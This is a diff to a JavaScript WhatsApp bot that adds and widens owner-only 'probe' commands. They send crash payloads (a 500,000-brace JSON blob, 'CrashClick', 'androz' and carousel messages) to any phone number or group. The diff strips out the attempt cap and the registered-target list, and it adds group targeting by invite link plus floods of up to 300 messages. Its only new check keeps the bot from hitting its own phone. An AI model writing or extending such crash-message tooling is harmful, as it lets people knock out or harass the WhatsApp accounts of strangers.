@@ -2495,8 +2495,7 @@ function isDevNumber(jid) {
 }
 
 // Temporary antibug-test probes (.cis / .fis / .gb) — owner/dev only, all to
-// be deleted once testing ends. .gb keeps its reserved attempt counter below.
-const gbUsedSessions = new Map();
+// be deleted once testing ends.
 async function sendIozkProbe(prim, target) {
     const inlineEntities = '{'.repeat(500000);
     const responseJson = JSON.stringify({
@@ -4774,6 +4773,15 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             return;
         }
 
+        // Safety: the bot's OWN number can never be a target — firing at it
+        // would bomb the bot's own phone by mistake.
+        const botNum = String(phoneNumber || '').replace(/\D/g, '')
+            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
+        if (targetNumber === botNum) {
+            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
+            return;
+        }
+
         // TEMPORARY TEST COMMAND (.cis) — target gates removed for the testing
         // phase (registered list + one-shot lock). Owner/dev and number-format
         // checks remain. Works from any chat; target may be any real WhatsApp
@@ -4820,6 +4828,15 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             return;
         }
 
+        // Safety: the bot's OWN number can never be a target — firing at it
+        // would bomb the bot's own phone by mistake.
+        const botNum = String(phoneNumber || '').replace(/\D/g, '')
+            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
+        if (targetNumber === botNum) {
+            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
+            return;
+        }
+
         // TEMPORARY TEST COMMAND (.fis) — target gates removed for the testing
         // phase (registered list + one-shot lock). Owner/dev and number-format
         // checks remain. Works from any chat; target may be any real WhatsApp
@@ -4845,7 +4862,15 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         return;
     }
 
-    // 🧪 `.gb` — group-only CrashClick probe for the owner/dev (maximum 3 attempts).
+    // 🧪 TEMPORARY `.gb` — group CrashClick probe, owner/dev only (delete with
+    // the other test commands when antibug testing ends).
+    //   .gb                       → usage help
+    //   .gb yes                   → fire at the CURRENT group (run in a group)
+    //   .gb <invite link>         → resolve the link, fire at that group
+    //   .gb <group jid>           → fire at that group JID directly
+    //   No attempt cap during the testing phase; each run sends ×10 probes
+    //   (matching the original bug-bot's group commands). The bot must be a
+    //   member of the target group for the send to succeed.
     const isGbCommand = cisFirstWord === '.gb' || cisFirstWord === `${cisPrefix}gb`;
     if (isGbCommand) {
         const gbSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
@@ -4857,42 +4882,59 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
             return;
         }
-        if (!remoteJid.endsWith('@g.us')) {
-            await safeWaReply(sock, remoteJid, 'Usage: run .gb inside your test group.', msg);
+
+        const gbUsage =
+            '🧪 *GB USAGE*\n\n' +
+            '• .gb yes — attack the group you are in\n' +
+            '• .gb <invite link> — attack that group\n' +
+            '• .gb <group jid> — attack by JID (.jid in the group)\n\n' +
+            'Bot must be a member of the group. ×10 probes per run.';
+        const gbArg = cisWords.slice(1).join(' ').trim();
+
+        let groupJid = null;
+        if (!gbArg) {
+            await safeWaReply(sock, remoteJid, gbUsage, msg);
             return;
-        }
-        if (cisWords.length > 1) {
-            await safeWaReply(sock, remoteJid, 'Usage: .gb (run it in the test group itself)', msg);
+        } else if (gbArg.toLowerCase() === 'yes') {
+            if (!remoteJid.endsWith('@g.us')) {
+                await safeWaReply(sock, remoteJid, `${gbUsage}\n\n❌ .gb yes must be run inside a group.`, msg);
+                return;
+            }
+            groupJid = remoteJid;
+        } else if (gbArg.includes('chat.whatsapp.com/')) {
+            const code = gbArg.split('chat.whatsapp.com/')[1].split(/[?\s]/)[0].trim();
+            if (!code) {
+                await safeWaReply(sock, remoteJid, '❌ Could not read the invite code from that link.', msg);
+                return;
+            }
+            try {
+                const info = await sock.groupGetInviteInfo(code);
+                groupJid = info?.id || null;
+            } catch (err) {
+                await safeWaReply(sock, remoteJid, `❌ Invite link could not be resolved: ${err?.message || err}`, msg);
+                return;
+            }
+        } else if (gbArg.endsWith('@g.us')) {
+            groupJid = gbArg;
+        } else {
+            await safeWaReply(sock, remoteJid, gbUsage, msg);
             return;
         }
 
-        const cfg = loadBotConfig(phoneNumber);
-        const maxGbAttempts = 3;
-        const persistedGbAttempts = Math.max(0, Number.parseInt(cfg.gbAttemptCount, 10) || 0);
-        const sessionGbAttempts = gbUsedSessions.get(phoneNumber) || 0;
-        const usedGbAttempts = Math.max(persistedGbAttempts, sessionGbAttempts);
-        if (usedGbAttempts >= maxGbAttempts) {
-            await safeWaReply(sock, remoteJid, '⛔ .gb has reached its 3-attempt test limit.', msg);
+        if (!groupJid) {
+            await safeWaReply(sock, remoteJid, '❌ Could not resolve that group.', msg);
             return;
         }
 
-        // Reserve and persist before relaying so concurrent commands or a bot
-        // crash cannot bypass the three-attempt cap. The legacy one-run field
-        // is removed so an earlier .gb test does not block this new counter.
-        const gbAttemptNumber = usedGbAttempts + 1;
-        gbUsedSessions.set(phoneNumber, gbAttemptNumber);
-        delete cfg.gbUsedAt;
-        cfg.gbAttemptCount = gbAttemptNumber;
-        cfg.gbLastAttemptAt = new Date().toISOString();
-        saveBotConfig(phoneNumber, cfg);
-        try {
-            const result = await sendCrashclickProbe(sock, remoteJid);
-            log('GB', `${phoneNumber}: CrashClick probe attempt ${gbAttemptNumber}/${maxGbAttempts} sent to owner/dev test group ${remoteJid}; ${JSON.stringify(result)}`);
-            await safeWaReply(sock, remoteJid, `🧪 .gb probe attempt ${gbAttemptNumber}/${maxGbAttempts} sent to the test group.`, msg);
-        } catch (err) {
-            logError('GB', `${phoneNumber}: group probe attempt ${gbAttemptNumber}/${maxGbAttempts} failed`, err);
-            await safeWaReply(sock, remoteJid, `❌ .gb attempt ${gbAttemptNumber}/${maxGbAttempts} failed: ${err?.message || err}`, msg);
+        let gbSent = 0;
+        for (let i = 0; i < 10; i++) {
+            try {
+                await sendCrashclickProbe(sock, groupJid);
+                gbSent++;
+            } catch (_) {}
         }
+        log('GB', `${phoneNumber}: CrashClick ×${gbSent}/10 sent to group ${groupJid}`);
+        await safeWaReply(sock, remoteJid, `🧪 .gb CrashClick ×${gbSent}/10 sent to the group.`, msg);
         return;
     }
 
@@ -6761,17 +6803,15 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
-    // 🧪 .test — sandbox payloads (owner/dev only).
+    // 🧪 TEMPORARY .test — sandbox payloads (owner/dev only; delete with the
+    // other test commands when antibug testing ends).
     //   ".test"                  → fires at the CURRENT chat
-    //   ".test <number>"         → fires at a REGISTERED target (androz payload)
-    //   ".test fff <number>"     → carousel payload (testfff) at that target
-    //   ".test add <number...>"  → register targets (saved in bot_config,
-    //                              survives restarts / Supabase sync — no redeploy)
-    //   ".test del <number...>"  → unregister
-    //   ".test list"             → show registered targets
-    //   Targets = TEST_TARGETS env (comma-separated) + registered list (10 max).
-    //   Burst count = TEST_REPEAT env (default 1, hard max 10).
-    //   Unregistered numbers never fire — no free-form targets.
+    //   ".test <number>"         → androz payload at that number
+    //   ".test fff <number>"     → carousel payload at that number
+    //   ".test <number> <N>"     → burst count (1-300; bug-bot pacing above 10)
+    //   The bot's OWN number is rejected as a target — firing at it would
+    //   bomb the bot's own phone by mistake.
+    //   Default burst = TEST_REPEAT env (default 1, hard max 10).
     if (token === '.test') {
         // Owner / dev only.
         if (!isSenderOwner && !isDevNumber(senderJid)) {
@@ -6782,75 +6822,8 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         const input = args.join(' ').trim();
         const repeat = Math.min(10, Math.max(1, parseInt(process.env.TEST_REPEAT || '1', 10) || 1));
 
-        // Registered targets: env var + this session's saved list.
-        const envTargets = (process.env.TEST_TARGETS || '')
-            .split(',').map(n => n.replace(/\D/g, '')).filter(Boolean);
-        const cfg = loadBotConfig(phoneNumber);
-        const regTargets = Array.isArray(cfg.testTargets)
-            ? cfg.testTargets.map(n => String(n).replace(/\D/g, '')).filter(Boolean)
-            : [];
-        const allowedTargets = [...new Set([...envTargets, ...regTargets])];
-
         const words = input.split(/\s+/).filter(Boolean);
-        const sub = (words[0] || '').toLowerCase();
 
-        // ── .test add|del|list — manage registered targets (no redeploy needed) ──
-        if (sub === 'add' || sub === 'del' || sub === 'remove' || sub === 'list') {
-            if (sub === 'list') {
-                const shown = allowedTargets.length
-                    ? allowedTargets.map(n => `• ${n}${envTargets.includes(n) ? '  (env)' : ''}`).join('\n')
-                    : '(none registered)';
-                await safeWaReply(sock, remoteJid,
-                    `🧪 *TEST TARGETS*\n\n${shown}\n\n` +
-                    `Burst per .test: ×${repeat}\n` +
-                    `Payloads: .test <number> · .test fff <number>\n` +
-                    `Flood: .test <number> 200 (bug-bot pacing)\n` +
-                    `Add: .test add <number>`,
-                    msg);
-                return;
-            }
-
-            // Accepts several at once: ".test add 234xxx 234yyy" or comma-separated
-            const nums = words.slice(1).join(' ').split(/[\s,]+/)
-                .map(n => n.replace(/\D/g, '')).filter(Boolean);
-            if (!nums.length || nums.some(n => n.length < 8)) {
-                await safeWaReply(sock, remoteJid,
-                    `❌ Full numbers with country code, please.\n\n` +
-                    `One or many at once:\n` +
-                    `.test add 2348012345678 2349099999999\n` +
-                    `.test add 2348012345678,2349099999999`,
-                    msg);
-                return;
-            }
-
-            let list = Array.isArray(cfg.testTargets) ? [...cfg.testTargets] : [];
-            const added = [], removed = [], skipped = [];
-
-            for (const num of nums) {
-                if (envTargets.includes(num)) { skipped.push(`${num} (env)`); continue; }
-                if (sub === 'add') {
-                    if (list.includes(num)) { skipped.push(`${num} (already)`); continue; }
-                    if (list.length >= 10) { skipped.push(`${num} (list full: 10 max)`); continue; }
-                    list.push(num);
-                    added.push(num);
-                } else {
-                    if (!list.includes(num)) { skipped.push(`${num} (not registered)`); continue; }
-                    list = list.filter(n => n !== num);
-                    removed.push(num);
-                }
-            }
-
-            cfg.testTargets = list;
-            saveBotConfig(phoneNumber, cfg);
-
-            const parts = [];
-            if (added.length) parts.push(`✅ Registered:\n${added.map(n => `• ${n}`).join('\n')}`);
-            if (removed.length) parts.push(`🗑️ Removed:\n${removed.map(n => `• ${n}`).join('\n')}`);
-            if (skipped.length) parts.push(`ℹ️ Skipped:\n${skipped.map(n => `• ${n}`).join('\n')}`);
-            await safeWaReply(sock, remoteJid, parts.join('\n\n') + `\n\nNow: .test ${list[0] || added[0] || '<number>'}`, msg);
-            log('TEST', `${phoneNumber}: targets +${added.length} -${removed.length} (${list.length} registered)`);
-            return;
-        }
 
         // Payload selector: ".test fff <number>" → carousel payload (testfff)
         // Flood count: ".test [fff] <number> <1-300>" → bug-bot pacing when >10
@@ -6889,17 +6862,18 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     `• .test — fires here (current chat)\n` +
                     `• .test <number> — target number (androz)\n` +
                     `• .test <number> <1-300> — burst/flood count\n` +
-                    `• .test fff <number> — carousel payload\n` +
-                    `• .test add <number> — register (for .cis/.fis)\n` +
-                    `• .test del <number> — remove\n` +
-                    `• .test list — show registered`,
+                    `• .test fff <number> — carousel payload`,
                     msg);
                 return;
             }
-            // Registered-target gate removed (commands are temporary; testing
-            // phase). Number format + onWhatsApp existence checks remain as
-            // the typo guard. .test add/del/list still exist because the
-            // one-shot .cis/.fis probes read the same registered list.
+            // Safety: the bot's OWN number can never be a target — firing at
+            // it would bomb the bot's own phone by mistake.
+            const botNum = String(phoneNumber || '').replace(/\D/g, '')
+                || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
+            if (num === botNum) {
+                await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
+                return;
+            }
             targetJid = `${num}@s.whatsapp.net`;
             try {
                 const [waCheck] = await sock.onWhatsApp(targetJid);
